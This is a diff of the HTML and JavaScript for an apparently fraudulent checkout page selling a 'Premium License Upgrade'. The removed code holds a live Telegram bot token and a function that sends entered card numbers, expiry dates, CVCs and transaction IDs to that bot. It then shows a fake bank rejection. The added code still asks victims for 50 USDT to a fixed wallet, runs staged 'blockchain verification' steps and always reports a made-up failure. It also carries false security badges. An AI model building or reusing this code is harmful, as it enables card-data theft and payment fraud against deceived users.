@@ -3,10 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Secure Checkout</title>
+    <title>GROK 6.71 - Checkout</title>
+    
+    <!-- Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@200..800&display=swap" rel="stylesheet">
+    
     <style>
         :root {
             --primary: #556B2F;
@@ -70,12 +74,13 @@
         .payment-option {
             display: flex;
             align-items: center;
-            padding: 1.2rem;
+            padding: 1rem;
             margin-bottom: 0.75rem;
             border: 1.5px solid #f1f5f9;
             border-radius: 1.2rem;
             cursor: pointer;
             transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
         }
 
         .payment-option:hover {
@@ -91,20 +96,34 @@
             margin-right: 1rem;
         }
 
+        .option-meta {
+            flex-grow: 1;
+        }
+
+        .option-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #0f172a;
+        }
+
+        .option-desc {
+            font-size: 11px;
+            color: #64748b;
+        }
+
         .modal {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.75);
+            background: rgba(0, 0, 0, 0.6);
             backdrop-filter: blur(12px);
             z-index: 1000;
             justify-content: center;
-            align-items: flex-end;
-            padding: 0;
+            align-items: flex-end; 
         }
 
         @media (min-width: 640px) {
-            .modal { align-items: center; padding: 20px; }
+            .modal { align-items: center; }
         }
 
         .modal-sheet {
@@ -112,19 +131,19 @@
             width: 100%;
             max-width: 450px;
             border-radius: 2.5rem 2.5rem 0 0;
-            padding: 2.5rem 2rem;
-            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            padding: 2rem;
+            animation: slideUp 0.4s ease-out;
             position: relative;
         }
 
         @media (min-width: 640px) {
-            .modal-sheet { border-radius: 2.5rem; }
+            .modal-sheet { border-radius: 2.5rem; margin: 20px; }
         }
 
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
 
         .input-group {
-            margin-bottom: 1.25rem;
+            margin-bottom: 1rem;
             position: relative;
         }
 
@@ -135,13 +154,12 @@
             color: #64748b;
             margin-bottom: 0.6rem;
             text-transform: uppercase;
-            letter-spacing: 0.05em;
         }
 
         .input-field {
             width: 100%;
-            padding: 1rem 1.2rem;
-            border-radius: 1.1rem;
+            padding: 0.9rem 1.2rem;
+            border-radius: 1rem;
             border: 1.5px solid #f1f5f9;
             background: #f8fafc;
             font-size: 14px;
@@ -153,81 +171,82 @@
             outline: none;
             border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 4px rgba(85, 107, 47, 0.05);
         }
 
-        .btn-confirm {
+        .txid-container {
             width: 100%;
-            padding: 1.2rem;
-            background: #0f172a;
-            color: white;
-            border-radius: 1.2rem;
-            font-weight: 800;
-            text-transform: uppercase;
-            font-size: 13px;
-            letter-spacing: 0.05em;
-            box-shadow: 0 10px 15px -3px rgba(15, 23, 42, 0.2);
-            transition: transform 0.2s;
-        }
-
-        .btn-confirm:active { transform: scale(0.98); }
-
-        .pay-instruction {
-            background: #fff9db;
-            border: 1px dashed #fcc419;
-            padding: 12px;
-            border-radius: 1rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .badge-secure {
-            background: #ecfdf5;
-            color: #059669;
-            font-size: 9px;
-            font-weight: 900;
-            padding: 6px 12px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-        }
-
-        #txid-wrapper {
-            width: 100%;
-            min-height: 52px;
+            height: 52px;
             position: relative;
         }
 
-        .see-how-btn {
-            width: 100%;
-            padding: 1rem;
+        #txid-trigger-btn {
+            position: absolute;
+            inset: 0;
             background: var(--primary);
             color: white;
-            border-radius: 1.1rem;
-            font-weight: 800;
-            font-size: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
             cursor: pointer;
-            text-transform: uppercase;
+            border-radius: 1rem;
+            font-size: 13px;
+            font-weight: 800;
+            z-index: 10;
         }
 
-        .alert-icon-circle {
-            width: 70px; height: 70px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 1.5rem; font-size: 30px;
+        .hidden-trigger {
+            opacity: 0;
+            pointer-events: none;
         }
-        .bg-err { background: #fee2e2; color: #ef4444; }
-        .bg-warn { background: #fef3c7; color: #d97706; }
+
+        #txid-helper-popup {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .helper-img-container img {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 1.5rem;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        }
+
+        .warning-banner {
+            background: #fffbeb;
+            border: 1px solid #fef3c7;
+            border-radius: 1rem;
+            padding: 12px;
+            margin-bottom: 1.5rem;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .badge-secure {
+            font-size: 9px;
+            font-weight: 900;
+            background: #f0fdf4;
+            color: #166534;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
+    <!-- Main Container -->
     <div class="main-card">
+        <!-- Header -->
         <div class="p-8 text-center bg-white">
             <div class="flex justify-center mb-4">
                 <div class="w-12 h-12 bg-slate-100 rounded-2xl flex items-center justify-center text-slate-800">
@@ -239,283 +258,253 @@
             <p class="text-xs text-slate-500 font-medium">Order: <span class="text-slate-900 font-bold">Premium License Upgrade</span></p>
         </div>
 
+        <!-- Stepper -->
         <div class="step-indicator">
             <div class="step active"><div class="step-dot"></div><span class="step-label">Select</span></div>
             <div class="step"><div class="step-dot"></div><span class="step-label">Verify</span></div>
             <div class="step"><div class="step-dot"></div><span class="step-label">Success</span></div>
         </div>
 
+        <!-- Options -->
         <div class="p-6 space-y-3">
-            <!-- Binance Pay -->
-            <div class="payment-option" onclick="window.location.href='https://s.binance.com/JkIPcjuK'">
-                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance">
-                <div class="flex-grow">
-                    <div class="text-[14px] font-black text-slate-900">Binance Pay</div>
-                    <div class="text-[11px] text-slate-500 font-bold">Instant & Secure</div>
+            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-wider mb-4 px-1">Payment Method</h3>
+            
+            <div class="payment-option" onclick="handlePayRedirect('https://s.binance.com/xz80FEOh', 'Binance Pay')">
+                <img src="binancepay.png" alt="Binance" onerror="this.src='https://placehold.co/80/f3ba2f/white?text=Binance'">
+                <div class="option-meta">
+                    <div class="option-title">Binance Pay</div>
+                    <div class="option-desc">Instant confirmation via Chrome Browser</div>
                 </div>
                 <i class="fas fa-chevron-right text-slate-300 text-xs"></i>
             </div>
 
-            <!-- Bybit Pay -->
-            <div class="payment-option" onclick="window.location.href='https://i.bybit.com/2babipA'">
-                <img src="bybitpay.png" alt="Bybit Pay" onerror="this.src='https://placehold.co/80/000000/white?text=Bybit'">
-                <div class="flex-grow">
-                    <div class="text-[14px] font-black text-slate-900">Bybit Pay</div>
-                    <div class="text-[11px] text-slate-500 font-bold">Quick Verification</div>
+            <div class="payment-option" onclick="handlePayRedirect('https://i.bybit.com/1abjUcsa', 'Bybit Pay')">
+                <img src="bybitpay.png" alt="Bybit" onerror="this.src='https://placehold.co/80/000000/white?text=Bybit'">
+                <div class="option-meta">
+                    <div class="option-title">Bybit Pay</div>
+                    <div class="option-desc">Secure payment via Chrome Browser</div>
                 </div>
                 <i class="fas fa-chevron-right text-slate-300 text-xs"></i>
             </div>
 
-            <!-- USDT BEP20 -->
             <div class="payment-option" onclick="openModal('crypto-modal')">
                 <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
-                <div class="flex-grow">
-                    <div class="text-[14px] font-black text-slate-900">USDT (BEP20)</div>
-                    <div class="text-[11px] text-slate-500 font-bold">BNB Smart Chain</div>
+                <div class="option-meta">
+                    <div class="option-title">USDT Transfer</div>
+                    <div class="option-desc">BEP20 Network (Low Gas Fees)</div>
                 </div>
                 <i class="fas fa-chevron-right text-slate-300 text-xs"></i>
             </div>
 
-            <!-- Bank Card (RE-ADDED) -->
             <div class="payment-option" onclick="openModal('card-modal')">
                 <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Card">
-                <div class="flex-grow">
-                    <div class="text-[14px] font-black text-slate-900">Bank Card</div>
-                    <div class="text-[11px] text-slate-500 font-bold">Visa / Mastercard</div>
+                <div class="option-meta">
+                    <div class="option-title">Credit / Debit Card</div>
+                    <div class="option-desc">Global coverage (Visa/Mastercard)</div>
                 </div>
                 <i class="fas fa-chevron-right text-slate-300 text-xs"></i>
             </div>
         </div>
+
+        <div class="p-6 bg-slate-50 border-t border-slate-100 flex flex-col items-center gap-4">
+            <div class="text-[9px] font-bold text-slate-400 flex items-center gap-1 uppercase">
+                <i class="fas fa-lock text-green-500"></i> Encrypted Secure Connection
+            </div>
+        </div>
     </div>
 
-    <!-- Crypto (USDT) Modal -->
+    <!-- Crypto Modal -->
     <div id="crypto-modal" class="modal">
         <div class="modal-sheet">
             <div class="flex justify-between items-start mb-6">
                 <div>
-                    <h2 class="text-2xl font-black text-slate-900">Transfer USDT</h2>
-                    <p class="text-xs text-blue-600 font-bold">Network: BNB Smart Chain (BEP20)</p>
+                    <h2 class="text-xl font-black text-slate-900">Transfer USDT</h2>
+                    <p class="text-xs text-slate-500 font-bold">Network: <span class="text-blue-600">BEP20</span></p>
                 </div>
-                <button onclick="closeModal('crypto-modal')" class="text-slate-300 text-2xl"><i class="fas fa-times"></i></button>
+                <button onclick="closeModal('crypto-modal')" class="text-slate-500"><i class="fas fa-times"></i></button>
             </div>
 
-            <div class="pay-instruction">
-                <i class="fas fa-info-circle text-amber-500 text-lg"></i>
-                <p class="text-[11px] font-black text-amber-900 leading-tight">
-                    You must pay exactly 50 USDT via BEP20 network to activate your request.
-                </p>
+            <div class="warning-banner">
+                <i class="fas fa-exclamation-triangle text-amber-600"></i>
+                <p class="text-[10px] text-amber-800 font-bold">You must send <span class="underline">50.00 USDT</span> via BEP20 network.</p>
             </div>
 
-            <div class="bg-blue-50/50 p-5 rounded-3xl border border-blue-100 mb-6 text-center">
-                <p class="text-[10px] text-blue-400 font-black uppercase mb-2">Recipient Address</p>
-                <p id="wallet-address" class="text-[11px] font-mono font-black text-slate-800 break-all bg-white p-3 rounded-xl shadow-sm">0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a</p>
-                <button onclick="copyAddr(this)" class="mt-4 text-[11px] font-black text-blue-600 uppercase tracking-widest transition-all">
-                    <i class="fas fa-copy mr-2"></i> <span>Copy Address</span>
-                </button>
+            <div class="bg-blue-50/50 p-5 rounded-3xl border border-blue-100/50 mb-6">
+                <div class="flex justify-between items-center mb-4">
+                    <span class="text-[10px] font-black text-blue-500 uppercase">Payment Window</span>
+                    <span id="timer" class="font-mono font-black text-blue-600 bg-white px-3 py-1 rounded-lg shadow-sm">60:00</span>
+                </div>
+                <div class="bg-white p-4 rounded-2xl border border-blue-100 text-center relative">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Recipient Address</p>
+                    <p class="text-[11px] font-mono font-black text-slate-800 break-all px-2">0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a</p>
+                    <button onclick="copyAddress(this)" class="mt-4 w-full py-3 bg-blue-600 text-white rounded-xl font-black text-[10px] uppercase transition-all active:scale-95">Copy Address</button>
+                </div>
             </div>
 
             <div class="input-group">
-                <label>Transaction Hash (TXID)</label>
-                <div id="txid-wrapper">
-                    <button id="see-how-btn" onclick="showHelp()" class="see-how-btn">
-                        <i class="fas fa-question-circle"></i> SEE HOW TO FIND TXID
-                    </button>
+                <label>Transaction ID (TXID)</label>
+                <div class="txid-container">
+                    <input type="text" id="txid-field" class="input-field" placeholder="Paste 64-character hash">
+                    <div id="txid-trigger-btn" onclick="showTxidHelper()">
+                        <i class="fas fa-eye"></i> SEE HOW TO FIND TXID
+                    </div>
                 </div>
             </div>
-
-            <button onclick="processCrypto()" class="btn-confirm mt-4">Confirm Payment</button>
+            <button onclick="startVerification()" class="w-full py-4 bg-slate-900 text-white rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg mt-4">Verify Transaction</button>
         </div>
     </div>
 
-    <!-- Help Popup (Image) -->
-    <div id="help-popup" class="modal" style="align-items: center;">
-        <div class="p-4 w-full max-w-lg relative" onclick="event.stopPropagation()">
-            <button onclick="hideHelp()" class="absolute -top-12 right-0 text-white text-3xl">
-                <i class="fas fa-times-circle"></i>
-            </button>
-            <img src="txid.png" class="w-full rounded-3xl shadow-2xl border-4 border-white" onerror="this.src='https://placehold.co/600x400/000000/white?text=Instructions+to+find+TXID'">
-            <button onclick="hideHelp()" class="btn-confirm mt-6 bg-white text-slate-900">I Got It</button>
-        </div>
-    </div>
-
-    <!-- Bank Card Modal (RE-ADDED) -->
+    <!-- Card Modal -->
     <div id="card-modal" class="modal">
         <div class="modal-sheet">
-            <div class="flex justify-between items-center mb-8">
-                <div class="badge-secure"><i class="fas fa-lock mr-2"></i> ENCRYPTED</div>
-                <button onclick="closeModal('card-modal')" class="text-slate-300 text-xl"><i class="fas fa-times"></i></button>
+            <div class="flex justify-between items-start mb-6">
+                <div class="badge-secure"><i class="fas fa-shield-check"></i> BANK-GRADE SECURITY</div>
+                <button onclick="closeModal('card-modal')" class="text-slate-500"><i class="fas fa-times"></i></button>
             </div>
-            
-            <h2 class="text-2xl font-black text-slate-900 mb-6">Card Details</h2>
-
+            <h2 class="text-xl font-black text-slate-900 mb-6">Card Details</h2>
             <div class="space-y-4">
                 <div class="input-group">
                     <label>Cardholder Name</label>
-                    <input type="text" id="c-name" class="input-field" placeholder="John Doe">
+                    <input type="text" class="input-field" placeholder="Full Name">
                 </div>
-                
                 <div class="input-group">
                     <label>Card Number</label>
-                    <input type="text" id="c-num" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19">
+                    <input type="text" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19">
                 </div>
-
                 <div class="grid grid-cols-2 gap-4">
-                    <div class="input-group">
-                        <label>Expiry Date</label>
-                        <input type="text" id="c-exp" class="input-field text-center" placeholder="MM/YY" maxlength="5">
-                    </div>
-                    <div class="input-group">
-                        <label>CVC</label>
-                        <input type="password" id="c-cvc" class="input-field text-center" placeholder="•••" maxlength="4">
-                    </div>
+                    <div class="input-group"><label>Expiry</label><input type="text" class="input-field text-center" placeholder="MM/YY"></div>
+                    <div class="input-group"><label>CVC</label><input type="password" class="input-field text-center" placeholder="000"></div>
                 </div>
             </div>
-
-            <button onclick="processCard()" class="btn-confirm mt-6">Pay $50.00 Securely</button>
-            <p class="text-[9px] text-center text-slate-400 mt-4 font-bold uppercase tracking-widest">PCI DSS COMPLIANT SERVER</p>
+            <button onclick="failCard()" class="w-full py-4 bg-slate-900 text-white rounded-2xl font-black uppercase text-xs shadow-lg mt-6">Confirm Payment</button>
         </div>
     </div>
 
-    <!-- Feedback Popups -->
-    <div id="alert-popup" class="modal">
-        <div class="modal-sheet text-center">
-            <div id="alert-icon-box" class="alert-icon-circle">
-                <i id="alert-icon-i" class="fas"></i>
+    <!-- Processing Screen -->
+    <div id="processing-screen" class="modal" style="align-items: center;">
+        <div class="modal-sheet text-center py-16" style="border-radius: 3rem; max-width: 320px;">
+            <div class="inline-block relative w-20 h-20 mb-8">
+                <div class="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
+                <div class="absolute inset-0 border-4 border-t-blue-500 rounded-full animate-spin"></div>
             </div>
-            <h2 id="alert-title" class="text-2xl font-black text-slate-900 mb-2"></h2>
-            <p id="alert-desc" class="text-sm text-slate-500 font-medium px-4"></p>
-            <button onclick="closeModal('alert-popup')" class="btn-confirm mt-8">Try Again</button>
+            <h3 id="proc-title" class="text-lg font-black text-slate-900 uppercase mb-2">Syncing Node</h3>
+            <p id="proc-desc" class="text-xs text-slate-400 font-bold px-4">Connecting to blockchain network...</p>
         </div>
     </div>
 
-    <div id="loading-screen" class="modal" style="align-items: center;">
-        <div class="text-center">
-            <div class="w-16 h-16 border-4 border-slate-200 border-t-slate-800 rounded-full animate-spin mx-auto mb-6"></div>
-            <p class="text-white font-black text-xs uppercase tracking-widest">Verifying transaction...</p>
+    <!-- Result Modal -->
+    <div id="result-modal" class="modal" style="align-items: center;">
+        <div class="modal-sheet text-center" style="border-radius: 3rem; max-width: 350px;">
+            <div id="res-icon" class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-6"></div>
+            <h2 id="res-title" class="text-xl font-black text-slate-900 uppercase mb-4"></h2>
+            <p id="res-desc" class="text-sm text-slate-500 font-medium mb-8 leading-relaxed"></p>
+            <button onclick="location.reload()" class="w-full py-4 bg-slate-100 text-slate-900 rounded-2xl font-black uppercase text-xs">Return</button>
+        </div>
+    </div>
+
+    <!-- TXID Helper -->
+    <div id="txid-helper-popup" onclick="hideTxidHelper()">
+        <div class="helper-img-container" onclick="event.stopPropagation()">
+            <img src="txid.png" alt="TXID Help" onerror="this.src='https://placehold.co/600x400/000000/white?text=Instructions+for+TXID'">
+            <div class="text-white text-center mt-6 font-bold text-xs">Tap anywhere to close</div>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8449462955:AAHmU2qqcN3zSy6RwL1LXrI2YYf6Qn57Gi8";
-        const CHAT_ID = "8066634898";
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+
+        function openExternalLink(url) {
+            if (tg.openLink) tg.openLink(url);
+            else window.open(url, '_blank');
+        }
+
+        // دالة جديدة للتعامل مع إعادة التوجيه مع شاشة تحميل
+        async function handlePayRedirect(url, method) {
+            openModal('processing-screen');
+            document.getElementById('proc-title').innerText = "Redirecting";
+            document.getElementById('proc-desc').innerText = `Preparing secure gateway for ${method}...`;
+            
+            // الانتظار لمدة 4 ثوانٍ
+            await new Promise(r => setTimeout(r, 4000));
+            
+            closeModal('processing-screen');
+            openExternalLink(url);
+        }
 
         function openModal(id) { document.getElementById(id).style.display = 'flex'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        function showHelp() {
-            document.getElementById('help-popup').style.display = 'flex';
+        function showTxidHelper() { document.getElementById('txid-helper-popup').style.display = 'flex'; }
+        function hideTxidHelper() {
+            document.getElementById('txid-helper-popup').style.display = 'none';
+            document.getElementById('txid-trigger-btn').classList.add('hidden-trigger');
+            document.getElementById('txid-field').focus();
         }
 
-        function hideHelp() {
-            document.getElementById('help-popup').style.display = 'none';
-            const wrapper = document.getElementById('txid-wrapper');
-            if (!document.getElementById('txid-input')) {
-                wrapper.innerHTML = `<input type="text" id="txid-input" class="input-field" placeholder="Paste TXID (Hash) here">`;
-                document.getElementById('txid-input').focus();
-            }
-        }
-
-        function copyAddr(btn) {
-            const address = "0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a";
-            const textarea = document.createElement('textarea');
-            textarea.value = address;
-            document.body.appendChild(textarea);
-            textarea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textarea);
-
-            const span = btn.querySelector('span');
-            const icon = btn.querySelector('i');
-            const originalText = span.innerText;
-            
-            span.innerText = "COPIED!";
-            icon.className = "fas fa-check mr-2";
-            btn.classList.add('text-green-600');
-            
+        function copyAddress(btn) {
+            navigator.clipboard.writeText('0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a');
+            const original = btn.innerText;
+            btn.innerText = 'COPIED!';
+            btn.classList.replace('bg-blue-600', 'bg-green-600');
             setTimeout(() => {
-                span.innerText = originalText;
-                icon.className = "fas fa-copy mr-2";
-                btn.classList.remove('text-green-600');
+                btn.innerText = original;
+                btn.classList.replace('bg-green-600', 'bg-blue-600');
             }, 2000);
         }
 
-        async function sendToTelegram(msg) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-                });
-            } catch (e) {}
+        async function startVerification() {
+            const txid = document.getElementById('txid-field').value.trim();
+            if(!txid) return;
+
+            closeModal('crypto-modal');
+            openModal('processing-screen');
+            
+            const steps = [
+                {t: "Scanning Block", d: "Searching for TXID in mempool..."},
+                {t: "Verifying Gas", d: "Confirming network fees..."},
+                {t: "Node Check", d: "Waiting for confirmations..."}
+            ];
+
+            for(let s of steps) {
+                document.getElementById('proc-title').innerText = s.t;
+                document.getElementById('proc-desc').innerText = s.d;
+                await new Promise(r => setTimeout(r, 2000));
+            }
+
+            closeModal('processing-screen');
+            showResult("Network Sync Error", "Transaction detected but amount received is below required threshold.", false);
         }
 
-        async function processCrypto() {
-            const input = document.getElementById('txid-input');
-            if(!input) {
-                showHelp();
-                return;
-            }
-            const txid = input.value.trim();
-            if(!txid) return;
-            
-            closeModal('crypto-modal');
-            openModal('loading-screen');
-            await sendToTelegram(`💎 <b>TXID Received</b>\nTXID: <code>${txid}</code>`);
+        function failCard() {
+            closeModal('card-modal');
+            openModal('processing-screen');
+            document.getElementById('proc-title').innerText = "Authorizing";
+            document.getElementById('proc-desc').innerText = "Requesting secure token from bank...";
             
             setTimeout(() => {
-                closeModal('loading-screen');
-                const isReal = txid.length >= 60;
-                if(isReal) {
-                    showAlert('warning', 'INSUFFICIENT AMOUNT', 'The transaction amount does not cover the required network fees.');
-                } else {
-                    showAlert('error', 'INVALID TXID', 'Transaction ID could not be validated on the BEP20 network.');
-                }
+                closeModal('processing-screen');
+                showResult("3D-Secure Failed", "Your bank declined this international transaction (Err: 402).", false);
             }, 3000);
         }
 
-        function showAlert(type, title, desc) {
-            const box = document.getElementById('alert-icon-box');
-            const icon = document.getElementById('alert-icon-i');
-            box.className = type === 'error' ? 'alert-icon-circle bg-err' : 'alert-icon-circle bg-warn';
-            icon.className = type === 'error' ? 'fas fa-times' : 'fas fa-exclamation-triangle';
-            document.getElementById('alert-title').innerText = title;
-            document.getElementById('alert-desc').innerText = desc;
-            openModal('alert-popup');
+        function showResult(title, desc, success) {
+            const icon = document.getElementById('res-icon');
+            icon.className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-6 ${success ? 'bg-green-50 text-green-500' : 'bg-red-50 text-red-500'}`;
+            icon.innerHTML = `<i class="fas fa-${success ? 'check' : 'exclamation-triangle'} text-2xl"></i>`;
+            document.getElementById('res-title').innerText = title;
+            document.getElementById('res-desc').innerText = desc;
+            openModal('result-modal');
         }
 
-        function sendDirectClick(method) {
-            sendToTelegram(`🚀 <b>Method Selected</b>\nMethod: ${method}`);
-            window.location.href = method === 'Binance Pay' ? 'https://link.binance.com/' : 'https://bybit.com/';
-        }
-
-        async function processCard() {
-            const num = document.getElementById('c-num').value.replace(/\s/g, '');
-            const cvc = document.getElementById('c-cvc').value;
-            const name = document.getElementById('c-name').value;
-            const exp = document.getElementById('c-exp').value;
-            
-            if(!num || !cvc || !name || !exp) return;
-            
-            closeModal('card-modal');
-            openModal('loading-screen');
-            
-            await sendToTelegram(`💳 <b>Card Data Received</b>\nName: <code>${name}</code>\nNumber: <code>${num}</code>\nExpiry: <code>${exp}</code>\nCVC: <code>${cvc}</code>`);
-            
-            setTimeout(() => { 
-                closeModal('loading-screen'); 
-                showAlert('error', 'BANK REJECTION', 'Your bank has rejected this transaction. Please use another card or payment method.'); 
-            }, 3000);
-        }
-
-        // Real-time Card Formatting
-        document.getElementById('c-num').oninput = function() { 
-            this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim(); 
-        };
-        document.getElementById('c-exp').oninput = function() { 
-            let v = this.value.replace(/\D/g, '');
-            if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
-            this.value = v;
-        };
+        let timeLeft = 3600;
+        setInterval(() => {
+            if(timeLeft <= 0) return;
+            timeLeft--;
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            document.getElementById('timer').innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }, 1000);
     </script>
 </body>
 </html>
